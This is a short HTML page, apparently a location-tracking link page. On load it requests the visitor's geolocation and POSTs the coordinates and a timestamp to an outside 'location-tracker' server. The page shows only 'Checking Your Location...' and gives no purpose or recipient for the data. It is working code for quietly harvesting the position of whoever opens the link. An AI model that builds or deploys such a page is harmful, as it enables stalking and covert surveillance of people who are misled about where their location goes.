<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Location Access</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
      background-color: #f0f2f5;
    }
    h2 {
      color: #333;
    }
  </style>
</head>
<body>
  <h2>Checking Your Location...</h2>

  <script>
    function sendLocation(position) {
      const { latitude, longitude } = position.coords;
      const timestamp = new Date().toISOString();

      fetch("https://location-tracker-balt.onrender.com/receive-location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude, longitude, timestamp })
      })
      .then(() => {
        document.body.innerHTML = "<h2>Location Sent Successfully!</h2>";
      })
      .catch(() => {
        document.body.innerHTML = "<h2>Failed to Send Location.</h2>";
      });
    }

    function handleError(error) {
      document.body.innerHTML = `<h2>Location access denied: ${error.message}</h2>`;
    }

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(sendLocation, handleError);
    } else {
      document.body.innerHTML = "<h2>Your browser doesn't support geolocation.</h2>";
    }
  </script>
</body>
</html>
